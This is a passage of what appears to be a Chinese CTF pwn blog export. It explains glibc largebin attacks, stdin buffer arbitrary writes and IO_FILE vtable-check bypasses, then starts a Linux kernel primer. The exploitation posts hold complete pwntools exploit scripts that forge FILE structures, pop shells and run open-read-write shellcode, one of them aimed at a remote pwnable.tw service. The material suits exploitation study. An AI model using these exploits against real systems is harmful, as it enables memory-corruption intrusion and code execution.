(P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; 再看看largebin的unlink检查，从代码中可以看到，就是多了fd_nextsize和bk_nextsize俩个位置的检查，原理和fd和bk的检查一致。但是需要注意的是对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的fd_nextsize和bk_nextsize为空。也就是说即使它是largebin chunk，但是它的fd_nextsize也为空，即不满足条件__builtin_expect (P-&gt;fd_nextsize != NULL, 0)，对于此类chunk的unlink，只会像smallbin的unlink一样检查fd与bk，而不会对fd_nextsize与bk_nextsize进行检查与操作。 至此largebin链表的形成以及申请largebin都已经阐述清楚。再小结下，对于largebin的链表的插入，双链表是从大到小的chunk排序，相同大小的chunk会有一个堆头，只有堆头的fd_nextsize与bk_nextsize会被赋值，其余堆块的该字段为0。插入的遍历是通过fd_nextsize从大到小进行的，如果该插入的chunk存在对应堆头，则插入到该堆头的下一个结点，否则的话该chunk会成为堆头插入到链表中。 对于largebin的申请，通过判断双链表的第一个结点（最大结点）的大小来判断是否存在满足的堆块，如果有则从小到大通过bk_nextsize反向遍历双链表，找到最小的满足申请需求的堆块，如果该堆头下一个结点的大小也满足则将该结点作为目标分配给用户，以此减少链表的fd_nextsize与bk_nextsize操作，提高效率。对于双链表的unlink，需要注意的就是fd_nextsize与bk_nextsize检查，特别需要注意的是当结点是堆头的下一个结点时，它的fd_nextsize与bk_nextsize为0，此时unlink操作与smallbin的unlink操作一致，没有fd_nextsize与bk_nextsize的检查与操作。 0x02 largebin attacklargebin attack是在largebin双链表的插入与取下的过程中出现问题，导致可以被申请出非预期内存的情形。总的来说存在两种攻击方式： 在申请largebin的过程中，伪造largebin的bk_nextsize，实现非预期内存申请。 在largebin插入的过程中，伪造largebin的bk_nextsize以及bk，实现任意地址写堆地址。 下面结合源码和实例具体看这两种攻击方式。 2.1 伪造伪造largebin的bk_nextsize原理分析此利用方式是在申请largebin的过程中出现的。回到申请largebin的源码中去看，它先判断当前双链表中存在满足申请需求的堆块（判断第一个堆块的大小），然后通过bk_nextsize反向遍历双链表找到第一个大于申请需求的堆块，申请该堆头对应的堆块。 12345678910111213141516if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //判断链表的第一个结点，即最大的chunk是否大于要申请的size &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) //从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环 victim = victim-&gt;bk_nextsize; //漏洞点，伪造bk_nextsize if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。 victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); //largebin unlink 操作 ... return p; 问题出现在通过bk_nextsize反向遍历双链表的过程，如果能够伪造某个堆头结点中的bk_nextsize，将其指向非预期的内存地址，构造好数据使得非预期内存地址在通过unlink的检查之后，会将该空间返回给用户，最终使得可以申请出非预期的内存。最常见的就是用它来构造overlap chunk。 至于绕过unlink的检查，我认为最好的方式就是伪造的内存空间将fd与bk按照smallbinunlink的利用方式设置，而将bk_nextsize和fd_nextsize设置成0，这样就不会对这两个字段进行操作了。 典型的应用场景为：存在四个堆ABCD，largebin中存在链表A-&gt;B，其中A为0x420，B为0x400，C为0x410，C未释放。将B的bk_nextsize伪造指向C，同时将C的fd与bk构造好，将C的fd_nextsize与bk_nextsize赋值为0，当再次申请0x410大小的内存E时，遍历B-&gt;bk_nextsize会指向C，且C的大小满足需求，因此会调用unlink将C从双链表取下，因此申请出来的堆块E的地址会为C的地址，即E和C为同一内存块，实现overlap chunk的构造。","tags":[{"name":"largebin_attack","slug":"largebin-attack","permalink":"wood1314.github.io/tags/largebin-attack/"},{"name":"heap","slug":"heap","permalink":"wood1314.github.io/tags/heap/"}]},{"title":"stdin任意地址写","date":"2020-04-10T14:22:58.000Z","path":"year/04/10/cl6ewldaq0042j63f782qwrkt/","text":"stdin标准输入缓冲区指针进行任意地址写的功能。 0x01 原理先通过fread回顾下通过输入缓冲区进行输入的流程： 判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用的_IO_doallocbuf去初始化输入缓冲区。 在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。 如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用__underflow函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。假设我们能过控制输入缓冲区指针，使得输入缓冲区指向想要写的地址，那么在第三步调用系统调用读取数据到输入缓冲区的时候，也就会调用系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的。 根据fread的源码，我们再看下要想实现往write_start写长度为write_end - write_start的数据具体经历了些什么。 12345678910111213141516171819202122232425262728293031_IO_size_t_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)&#123; ... if (fp-&gt;_IO_buf_base == NULL) &#123; ... //输入缓冲区为空则初始化输入缓冲区 &#125; while (want &gt; 0) &#123; have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr; if (have &gt; 0) &#123; ... //memcpy &#125; if (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123; if (__underflow (fp) == EOF) ## 调用__underflow读入数据 ... &#125; ... return n - want;&#125; 将上述条件综合表述为： 设置_IO_read_end等于_IO_read_ptr。 设置_flag &amp;~ _IO_NO_READS即_flag &amp;~ 0x4。 设置_fileno为0。 设置_IO_buf_base为write_start，_IO_buf_end为write_end；且使得_IO_buf_end-_IO_buf_base大于fread要读的数据。0x02 例题whctf2017的stackoverflow 申请超过0x20000申请的空间会挨着libc 因为最后置零用的是temp不是size不一致导致了可以向后面任意一个位置写0，写到IO_buf_base的位置上然后就可以改IO_buf_end了，实现任意地址写。 向malloc_hook中写rop读取数据形成栈溢出(这都行。。。。。)12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.log_level = 'debug'sh = process('./stackoverflow')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def malloc_one(size=0,data=\"\",real_size=0,flag=False): sh.recvuntil(\"flow: \") sh.sendline(str(size)) if flag: sh.recvuntil(\"ckoverflow: \") sh.sendline(str(real_size)) sh.recvuntil(\"ropchain:\") sh.send(data)def evil_write(data): sh.recvuntil(\"flow:\") sh.send(data)def flush_buff(size): for i in range(0,size): sh.recvuntil(\"padding and ropchain: \") sh.sendline('a')sh.recvuntil('leave your name, bro:')sh.send('a'*32)sh.recvuntil('a'*32)libc_base = u64(sh.recv(6).ljust(8,'\\x00'))- 0x3c5620log.success('libc_base: ' + hex(libc_base)) io_stdin=libc_base+libc.symbols['_IO_2_1_stdin_']io_stdin_end=libc_base+libc.symbols['_IO_2_1_stdin_']+0xe0+0x10malloc_hook=libc_base+libc.symbols['__malloc_hook']rce = libc_base + 0x4526asize = 0x5c5908real_size = 0x200000malloc_one(size,p64(0),real_size,True)sh.recvuntil(\"please input the size to trigger stackoverflow:\")sh.send(p64(malloc_hook)*4 + p64(malloc_hook+0x8))flush_buff(39)sh.recvuntil(\" trigger stackoverflow: \")sh.send(p64(0xdeadbeef))gdb.attach(sh)sh.interactive()","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"wood1314.github.io/tags/IO-FILE/"}]},{"title":"IO_FILE_vtable_check","date":"2020-04-06T13:52:21.000Z","path":"year/04/06/cl6ewld91000tj63fvq49lhyy/","text":"0x00 简介在libc 2.24版本以后，对vtable的劫持进行了检测，但是这并没有增加利用的难度，反而更简单了。 参考：https://mp.weixin.qq.com/s/RDFsJrgkz4ywAwuFV7Rneg https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/#_io_str_jumps-finish 0x01 检测机制我还是直接用的bookwriter这道题来绕过vtable的检测。检测函数在/libio/libioP.h中： 123456789101112static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) //检查vtable指针是否在glibc的vtable段中。 /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; 可以看到glibc中是有一段完整的内存存放着各个vtable，其中__start___libc_IO_vtables指向第一个vtable地址_IO_helper_jumps，而__stop___libc_IO_vtables指向最后一个vtable_IO_str_chk_jumps结束的地址,最后进入_IO_vtable_check触发报错。 进入该函数意味着目前的vtable不是glibc中的vtable，因此_IO_vtable_check判断程序是否使用了外部合法的vtable（重构或是动态链接库中的vtable），如果不是则报错。 glibc2.24中vtable中的check机制可以小结为： 1.判断vtable的地址是否处于glibc中的vtable数组段，是的话，通过检查。2.否则判断是否为外部的合法vtable（重构或是动态链接库中的vtable），是的话，通过检查。3.否则报错，输出Fatal error: glibc detected an invalid stdio handle，程序退出。 所以最终的原因是：exp中的vtable是堆的地址，不在vtable数组中，且无法通过后续的检查，因此才会报错。 0x02 利用方法使用内部的vtable_IO_str_jumps或_IO_wstr_jumps来进行利用 如何利用_IO_str_jumps或_IO_wstr_jumps完成攻击？在vtable的check机制出现后，大佬们发现了vtable数组中存在_IO_str_jumps以及_IO_wstr_jumps两个vtable，_IO_wstr_jumps与_IO_str_jumps功能基本一致，只是_IO_wstr_jumps是处理wchar的，因此这里以_IO_str_jumps为例进行说明，后者利用方法完全相同。 _IO_str_jumps的函数表如下 函数表中存在两个函数_IO_str_overflow以及_IO_str_finish，其中_IO_str_finish源代码如下，在文件/libio/strops.c中： 123456789void_IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); //执行函数 fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 条件： _IO_buf_base 不为空 _flags &amp; _IO_USER_BUF(0x01) 为假 构造如下： 12345678_flags = (binsh_in_libc + 0x10) &amp; ~1_IO_buf_base = binsh_addr_freeres_list = 0x2_freeres_buf = 0x3_mode = -1vtable = _IO_str_finish - 0x18fp+0xe8 -&gt; system_addr 0x03 示例 bookwriter123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *debug = 1context.log_level = 'debug'if debug: sh = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(sh)else: sh = remote('chall.pwnable.tw', 10304) libc = ELF('libc_64.so.6')def add(size,content): sh.recvuntil('Your choice :') sh.sendline('1') sh.recvuntil('Size of page :') sh.sendline(str(size)) sh.recvuntil(\"Content :\") sh.send(content)def view(idx): sh.recvuntil('Your choice :') sh.sendline('2') sh.recvuntil('Index of page :') sh.sendline(str(idx))def edit(idx,content): sh.recvuntil('Your choice :') sh.sendline('3') sh.recvuntil('Index of page :') sh.sendline(str(idx)) sh.recvuntil('Content:') sh.send(content)def info(choice): sh.recvuntil('Your choice :') sh.sendline('4')def leak_heap(): info(0) sh.recvuntil('a'*0x40) heapbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x10 log.success('heapbase: ' + hex(heapbase)) sh.recvuntil('(yes:1 / no:0) ') sh.sendline('0') return heapbasesh.recvuntil('Author :')sh.send('a'*0x40)add(0x18,'a'*0x18)edit(0,'a'*0x18)edit(0,'a'*0x18+'\\xe1\\x0f\\x00')edit(0,'\\x00')heap_base = leak_heap()for i in range(8): add(0x40,'wwwwwwww')view(1)sh.recvuntil('wwwwwwww')libc_base = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x3c5188log.success('libc_base: ' + hex(libc_base))bin_sh_addr = libc_base + libc.search('/bin/sh\\x00').next()IO_list_all = libc_base+libc.symbols['_IO_list_all'] - 0x10system_addr = libc_base + libc.symbols['system']vatable_addr = libc_base + 0x3c37a0 - 0x8payload = ''payload += '\\x00'*0x290 payload += p64(0)+ p64(0x61) # fake header # fppayload += p64(0) + p64(libc_base+libc.symbols['_IO_list_all'] - 0x10) # fake bk pointerpayload += p64(2) + p64(3) # fp-&gt;_IO_write_basepayload += p64(0) # fp-&gt;_IO_write_end,payload += p64(bin_sh_addr) # fp-&gt;_IO_buf_basepayload += p64(0) *19 # fp-&gt;_modepayload += p64(vatable_addr)payload += p64(0)payload += p64(system_addr)edit(0,payload)edit(0,'\\x00')sh.recvuntil('Your choice :')sh.sendline('1')sh.recvuntil('Size of page :')sh.sendline(str(0x10))sh.interactive() 0x04 2.27下利用fsop执行orw123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199from pwn import *context.log_level = 'debug'sh = process('./pwn')context.terminal = ['tmux', 'splitw', '-h']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context.arch = 'amd64'context.os = 'linux'def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \\ p32(0) + \\ p64(_IO_read_ptr) + \\ p64(_IO_read_end) + \\ p64(_IO_read_base) + \\ p64(_IO_write_base) + \\ p64(_IO_write_ptr) + \\ p64(_IO_write_end) + \\ p64(_IO_buf_base) + \\ p64(_IO_buf_end) + \\ p64(_IO_save_base) + \\ p64(_IO_backup_base) + \\ p64(_IO_save_end) + \\ p64(_IO_marker) + \\ p64(_IO_chain) + \\ p32(_fileno) file_struct = file_struct.ljust(0x88, \"\\x00\") file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, \"\\x00\") file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, '\\x00') file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, \"\\x00\") return file_structdef add(idx, size, content): sh.recvuntil('Your choice:') sh.sendline('1') sh.recvuntil('Index:\\n') sh.sendline(str(idx)) sh.recvuntil('Size:\\n') sh.sendline(str(size)) sh.recvuntil('Content:\\n') sh.send(content)def edit(idx, content): sh.recvuntil('Your choice:') sh.sendline('2') sh.recvuntil('Index:\\n') sh.sendline(str(idx)) sh.recvuntil('Content:\\n') sh.send(content)def move(idx): sh.recvuntil('Your choice:') sh.sendline('3') sh.recvuntil('Index:\\n') sh.sendline(str(idx))def show(idx): sh.recvuntil('Your choice:') sh.sendline('4') sh.recvuntil('Index:\\n') sh.sendline(str(idx))def gift(idx, size, content): sh.recvuntil('Your choice:') sh.sendline('666') sh.recvuntil('Index:\\n') sh.sendline(str(idx)) sh.recvuntil('Size:\\n') sh.sendline(str(size)) sh.recvuntil('Content:\\n') sh.send(content)for i in range(12): add(i, 0x100, 'a\\n')for i in range(7): move(i)move(8)move(10)sh.recvuntil('Your choice:')sh.sendline('1')sh.recvuntil('Index:\\n')sh.sendline(str(7))sh.recvuntil('Size:\\n')sh.sendline('-1')edit(7, 'a'*0x10f + '\\n')show(7)sh.recvuntil('\\n')libcbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - libc.sym['__malloc_hook'] - 0x70log.success('libcbase: ' + hex(libcbase))edit(7, 'a'*0x10f + 'a'*8 + '\\n')show(7)sh.recvuntil('\\n')heapbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 3312log.success('heapbase: ' + hex(heapbase))edit(7, 'a'*0x100+p64(0) + p64(0x111) + p64(libcbase + libc.sym['__malloc_hook'] + 0x70) + p64(heapbase + 3312) + '\\n')add(7, 0x100, 'a'*0x100)add(7, 0x100, 'a'*0x100)for i in range(7): add(i, 0x60, 'a\\n')for i in range(5): move(i)add(6, 0x100, 'a\\n')add(7, 0x100, 'a\\n')move(6)add(8, 0x90, 'a\\n') shellcode = '''mov rax,0x67616c662f2epush raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''frame = SigreturnFrame()frame.rsp = heapbase + 0x1770frame.rdi = heapbaseframe.rsi = 0x5000frame.rdx = 4 | 2 | 1frame.rip = libc.sym['mprotect'] + libcbaseadd(9, 0x200, str(frame) + '\\n')add(10, 0x100, 'a\\n')add(11, 0x100, p64(heapbase+0x1778) + asm(shellcode) + '\\x00\\n')move(10)add(10, 0x90, 'a\\n') #change this IO_str_jumps = libcbase + 0x3e8360binsh_addr = libc.search(\"/bin/sh\").next()payload = pack_file(_flags = 0, _IO_read_ptr = 0, #smallbin4file_size _IO_read_base = 0, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = heapbase + 0x1450, _mode = 0, )payload += p64(IO_str_jumps-8)payload += p64(0) # padddingpayload += p64(libcbase + libc.sym['setcontext'] + 53)add(11, 0x300, payload + '\\n')file_addr = heapbase + 6272sh.recvuntil('Your choice:')sh.sendline('1')sh.recvuntil('Index:\\n')sh.sendline(str(10))sh.recvuntil('Size:\\n')sh.sendline('-1')edit(10,'a'*0x90 + p64(0) + p64(0x71) + p64(heapbase + 4800) + p64(libcbase + libc.sym['_IO_list_all'] - 0x18) + '\\n')add(11, 0x60, 'a'*0x60)gift(11, 0x60, 'a'*8 + p64(file_addr) + '\\n')gdb.attach(sh)sh.interactive()","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"wood1314.github.io/tags/IO-FILE/"},{"name":"house of orange","slug":"house-of-orange","permalink":"wood1314.github.io/tags/house-of-orange/"}]},{"title":"内核入门","date":"2020-03-25T10:36:11.000Z","path":"year/03/25/cl6ewldb1004vj63fpftqsmhq/","text":"最近发现内核pwn题怎么这么多了。。。。感觉发展太快了，学习总结一波吧。 1 内核简介1.1 内核的组成通常一个内核由负责响应中断的中断服务程序，负责管理多个进程从而分享处理器时间的的调度程序，负责管理进程地址空间的内存管理程序和网络、进程间通信等系统服务程序共同组成。 1.2 内核与应用程序的交互在系统中运行的应用程序通过系统调用来于内核通信。应用程序调用库函数（比如C库函数）再由库函数通过系统调用界面，让内核代其完成各种不同的任务。当硬件设备想和系统通信的时候，它首先要发出一个异步的中断信号去打断处理器的执行，继而打断内核函数的执行。中断通常对应着一个中断号，内核通过这个中断号查找对应的中断服务程序，并调用程序相应和处理中断。许多操作系统的中断服务程序，包括linux的，都不在进程上下文执行。它们在一个与所有进程都无关的、专门的中断上下文中运行。 实际上我们可以将每个处理器在任何指定时间点上的活动必然概括为下列三者之一 运行于用户空间，执行用户进程 运行于内核空间，处于进程上下文，代表某个特定的进程执行 运行于内核空间，处于中断上下文，与任何进程无关，处理某个特定的中断。 1.3 单内核与微内核单内核通常以单个静态二进制文件的形式存放于磁盘中。所有内核服务都在这样一个大内核地址空间上运行，内核可以直接调用函数，具有简单和性能高的特点。 微内核微内核的功能被划分为多个独立的过程，每个过程叫做一个服务器 Linux是一个单内核，但是它汲取了微内核的精华：其引以为豪的是模块化设计，抢占式内核，支持内核线程以及动态装载内核模块的能力。 2 模块简介内核模块是Linux内核向外部提供的一个插口，其全称为动态可加载内核模块（Loadable Kernel Module，LKM），我们简称为模块。Linux内核之所以提供模块机制，是因为它本身是一个单内核（monolithic kernel）。单内核的最大优点是效率高，因为所有的内容都集成在一起，但其缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。 2.1 什么是模块模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程是不同的。模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能 2.2 编写一个简单的模块模块和内核都在内核空间运行，模块编程在一定意义上说就是内核编程。因为内核版本的每次变化，其中的某些函数名也会相应地发生变化，因此模块编程与内核版本密切相关。以下例子针对2.6内核 123456789101112131415161718192021hellomod.c// hello world driver for Linux 2.6#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;/* 必要的头文件*/static int __init lkp_init( void )&#123; printk(“&lt;1&gt;Hello,World! from the kernel space…\\n”); return 0;&#125;static void __exit lkp_cleanup( void )&#123; printk(“&lt;1&gt;Goodbye, World! leaving kernel space…\\n”);&#125;module_init(lkp_init);module_exit(lkp_cleanup);MODULE_LICENSE(“GPL”); 说明 第4行：所有模块都要使用头文件module.h，此文件必须包含进来。 第5行：头文件kernel.h包含了常用的内核函数。第6行：头文件init.h包含了宏_init和_exit，它们允许释放内核占用的内存。建议浏览一下该文件中的代码和注释。 第9-12行：这是模块的初始化函数，它必需包含诸如要编译的代码、初始化数据结构等内容。第11行使用了printk()函数，该函数是由内核定义的，功能与C库中的printf()类似，它把要打印的信息输出到终端或系统日志。字符串中的&lt;1&gt;是输出的级别，表示立即在终端输出。 第15-18行：这是模块的退出和清理函数。此处可以做所有终止该驱动程序时相关的清理工作。 第20行：这是驱动程序初始化的入口点。对于内置模块，内核在引导时调用该入口点；对于可加载模块则在该模块插入内核时才调用。第21行：对于可加载模块，内核在此处调用module_cleanup（）函数，而对于内置的模块，它什么都不做。第22行：提示可能没有GNU公共许可证。有几个宏是在2.4版的内核中才开发的（详情参见modules.h）。函数module_init()和cleanup_exit()是模块编程中最基本也是必须的两个函数。module_init()向内核注册模块所提供的新功能，而cleanup_exit()注销由模块提供的所有功能。 2.3 应用程序与内核模块的比较 C语言应用程序 内核模块程序 使用函数 Libc库 内核函数 运行空间 用户空间 内核空间 运行权限 普通用户 超级用户 入口函数 main() module_init() 出口函数 exit() module_exit() 编译 Gcc –c Makefile 链接 Gcc insmod 运行 直接运行 insmod 调试 Gdb kdbug, kdb,kgdb等 从表一我们可以看出，内核模块程序不能调用libc库中的函数，它运行在内核空间，且只有超级用户可以对其运行。另外，模块程序必须通过module_init()和module-exit()函数来告诉内核“我来了”和“我走了”。 2.4 内核符号表如 前所述，Linux内核是一个整体结构，像一个圆球，而模块是插入到内核中的插件。尽管内核不是一个可安装模块，但为了方便起见，Linux把内核也看作 一个“母”模块。那么模块与模块之间如何进行交互呢，一种常用的方法就是共享变量和函数。但并不是模块中的每个变量和函数都能被共享，内核只把各个模块中 主要的变量和函数放在一个特定的区段，这些变量和函数就统称为符号。到低哪些符号可以被共享？ Linux内核有自己的规定。对于内核这个特殊的母模块，在kernel/ksyms.c中定义了从中可以“移出”的符号，例如进程管理子系统可以“移出”的符号定义如下 12345678910111213141516171819/* 进程管理 */EXPORT_SYMBOL(do_mmap_pgoff);EXPORT_SYMBOL(do_munmap);EXPORT_SYMBOL(do_brk);EXPORT_SYMBOL(exit_mm);…EXPORT_SYMBOL(schedule);EXPORT_SYMBOL(jiffies);EXPORT_SYMBOL(xtime);… 其中宏定义EXPORT_SYMBOL（）本身的含义是“移出符号”。为什么说是“移出”呢？因为这些符号本来是内核内部的符号，通过这个宏放在一个公开的地方，使得装入到内核中的其他模块可以引用它们。 实际上，仅仅知道这些符号的名字是不够的，还得知道它们在内核地址空间中的地址才有意义。因此，内核中定义了如下结构来描述模块的符号： 123456789struct module_symbol&#123;unsigned long value; ／*符号在内核地址空间中的地址*/const char *name; /*符号名*/&#125;; 我们可以从/proc/ksyms文件中读取所有内核模块“移出”的符号，这所有符号就形成内核符号表，其格式如下： 内存地址 符号名 ［所属模块］ 在模块编程中，可以根据符号名从这个文件中检索出其对应的地址，然后直接访问该地址从而获得内核数据。第三列“所属模块”指符号所在的模块名，对于从内核这一母模块移出的符号，这一列为空。 模块加载后，2.4内核下可通过 /proc/ksyms、 2.6 内核下可通过/proc/kallsyms查看模块输出的内核符号 2.5 模块依赖如前所述，内核符号表记录了所有模块可以访问的符号及相应的地址。当一个新的模块被装入内核后，它所申明的某些符号就会被登记到这个表中，而这些符号可能被其他模块所引用，这就引出了模块依赖这个问题。 一个模块A引用另一个模块B所移出的符号，我们就说模块B被模块A引用，或者说模块A依赖模块B。如果要链接模块A，必须先链接模块B。这种模块间相互依赖的关系就叫模块依赖。 2.6 模块引用计数器为 了确保模块安全地卸载，每个模块都有一个引用计数器。当执行模块所涉及的操作时就递增计数器，在操作结束时就递减这个计数器；另外，当模块B被模块A引用 时，模块B的引用计数就递增，引用结束，计数器递减。什么时候可以卸载这个模块？当然只有这个计数器值为0的时候，例如，当一个文件系统还被安装在系统上 时就不能将其卸载，当这个文件系统不再被使用时，引用计数器就为0，于是可以卸载。 2.7 模块编译有了Makefile,执行make命令，会自动形成相关的后缀为.o和.ko文件。到此，模块编译好了，该把它插入到内核了：如：$insmod hellomod.ko 当然，要以系统员的身份才能把模块插入。 成功插入后，可以通过dmesg命令查看，屏幕最后几行的输出就是你程序中输出的内容：Hello,World! from the kernel space… 当模块不再需要时，可以通过rmmod命令移去，例如 $rmmod hellomod 3 系统调用系统调用，顾名思义，说的是操作系统提供给用户程序调用的一组“特殊”接口。用户程序可以通过这组“特殊”接口来获得操作系统内核提供的服务，比如用户可以通过文件系统相关的调用请求系统打开文件、关闭文件或读写文件，可以通过时钟相关的系统调用获得系统时间或设置定时器等。 3.1 Linux 的系统调用下一个需要解释一下的问题是内核函数和系统调用的关系。大家不要把内核函数想像的过于复杂，其实它们和普通函数很像，只不过在内核实现，因此要满足一些内核编程的要求[3]。系统调用是一层用户进入内核的接口，它本身并非内核函数，进入内核后，不同的系统调用会找到对应到各自的内核函数——换个专业说法就叫：系统调用服务例程。实际上针对请求提供服务的是内核函数而非调用接口。 比如系统调用 getpid实际上就是调用内核函数sys_getpid。 1234567asmlinkage long sys_getpid(void)&#123;return current-&gt;tpid;&#125; 总而言之，从用户角度向内核看，依次是系统命令、编程接口、系统调用和内核函数。在讲述了系统调用实现后，我们会回过头来看看整个执行路径。 4 状态切换4.1 user space to kernel space当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为： 通过 swapgs 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。 将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。 通过 push 保存各寄存器值，具体的 代码 如下: 123456789101112131415161718192021222324252627 ENTRY(entry_SYSCALL_64) /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */ SWAPGS_UNSAFE_STACK /* 保存栈值，并设置内核栈 */ movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp /* 通过push保存寄存器值，形成一个pt_regs结构 *//* Construct struct pt_regs on stack */pushq $__USER_DS /* pt_regs-&gt;ss */pushq PER_CPU_VAR(rsp_scratch) /* pt_regs-&gt;sp */pushq %r11 /* pt_regs-&gt;flags */pushq $__USER_CS /* pt_regs-&gt;cs */pushq %rcx /* pt_regs-&gt;ip */pushq %rax /* pt_regs-&gt;orig_ax */pushq %rdi /* pt_regs-&gt;di */pushq %rsi /* pt_regs-&gt;si */pushq %rdx /* pt_regs-&gt;dx */pushq %rcx tuichu /* pt_regs-&gt;cx */pushq $-ENOSYS /* pt_regs-&gt;ax */pushq %r8 /* pt_regs-&gt;r8 */pushq %r9 /* pt_regs-&gt;r9 */pushq %r10 /* pt_regs-&gt;r10 */pushq %r11 /* pt_regs-&gt;r11 */sub $(6*8), %rsp /* pt_regs-&gt;bp, bx, r12-15 not saved */ 通过汇编指令判断是否为 x32_abi。 通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。 4.2 kernel space to user space退出时，流程如下： 通过 swapgs 恢复 GS 值 通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等） 4.3 struct cred之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。 源码 如下: 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t 